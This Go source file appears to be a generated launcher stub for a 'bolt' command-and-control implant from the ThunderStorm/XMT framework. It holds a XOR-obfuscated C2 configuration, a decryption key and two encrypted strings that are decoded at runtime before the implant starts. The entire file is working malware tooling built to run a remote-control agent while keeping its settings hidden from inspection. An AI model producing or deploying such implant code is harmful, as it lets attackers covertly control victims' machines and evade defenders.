// Copyright (C) 2020 - 2023 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

package main

import (
	"os"

	"github.com/iDigitalFlame/ThunderStorm/bolt"
	"github.com/iDigitalFlame/xmt/c2/cfg"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/data/crypto/subtle"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/man"
)

var z = cfg.Config{
	0xC9, 0x84, 0xEB, 0x86, 0xAE, 0x2C, 0x5D, 0x58, 0x1C, 0xAB, 0xED, 0x08, 0x95, 0x35, 0xAF, 0xB4, 0x3A, 0x69, 0x38, 0xFC, 
	0x03, 0xD1, 0x16, 0xE6, 0x9A, 0x26, 0x75, 0x4D, 0x8F, 0xD1, 0xBB, 0x82, 0x97, 0x97, 0xD9, 0xD6, 0x8A, 0xDF, 0x45, 0x18, 
	0x2E, 0x45, 0xC7, 0xD7, 0xE0, 0xC1, 0xBD, 0x52, 0x44, 0xCD, 0x93, 0xB5, 0x9C, 0xF6, 0x2A, 0x7F, 0xD1, 0xE1, 0x0C, 0x2F, 
	0x99, 0x1F, 0x4A, 0x05, 0x79, 0x9A, 0x77, 0x5C, 0x47, 0xDE, 0x5F, 0x3E, 0x0B, 0x22, 0x5B, 0xD0, 0x2A, 0xE3, 0xBC, 0x05, 
	0x41, 0x2F, 0x61, 0x26, 0x77, 0xA4, 0xAC, 0x75, 0xE9, 0xC4, 0x4B, 0x6D, 0xF8, 0x41, 0x1B, 0xC2, 
}

var g = [...]byte{
	0x3E, 0xED, 0x8B, 0x8E, 0xAE, 0x38, 0x4F, 0x78, 0x1B, 0xA3, 0xF7, 0x12, 0xEA, 0x7A, 0xFA, 0xE3, 0x7E, 
}
var p = [...]byte{
	0x3E, 0xED, 0x8B, 0x8E, 0xAE, 0x38, 0x71, 0x51, 0x07, 0xB7, 0xFF, 0x1B, 0xCA, 0x49, 0xE9, 0xE8, 0x64, 0xBC, 
}
var k = [...]byte{
	0x69, 0x84, 0xE5, 0xEA, 0xC1, 0x4F, 0x3C, 0x34, 0x74, 0xC4, 0x9E, 0x7C, 0xAF, 0x0C, 0x9F, 0x8D, 0x0A, 0xC8, 0x38, 0xFC, 
	0x03, 0xD3, 0x42, 0xED, 0x7E, 0x26, 0xD7, 0x7F, 0x4F, 0x05, 0xBB, 0xC2, 0xFA, 0xC5, 0x1A, 0x5A, 0xCB, 0x05, 0xDB, 0xFB, 
	0x18, 0x3C, 0x2A, 0x74, 0xE8, 0xBF, 0x9D, 0x75, 0xFA, 0x78, 0x41, 0xD1, 0x14, 0x99, 0x86, 0xD4, 0x14, 0x7F, 0x35, 0x46, 
	0xD4, 0x4E, 0x2E, 0xCD, 
}

func main() {
	// NOTE(dij): Only ran if non-CGO or CGO main is called.
	if false {
		device.GoExit()
		return
	}
	subtle.XorOp(z, k[:])
	// NOTE(dij): "os.Args" Will only work if non-CGO, GO-CGO cannot access argv.
	bolt.Start(
		false || len(os.Args) > 2, true, false, false, man.LinkerFromName(`e`),
		crypto.UnwrapString(k[:], g[:]), crypto.UnwrapString(k[:], p[:]), z,
	)
}

func secondary() {
	// NOTE(dij): Reserved for CGO secondary functions.
	if false {
		device.GoExit()
		return
	}
	subtle.XorOp(z, k[:])
	bolt.Start(
		true, true, false, false, man.LinkerFromName(`e`),
		crypto.UnwrapString(k[:], g[:]), crypto.UnwrapString(k[:], p[:]), z,
	)
}
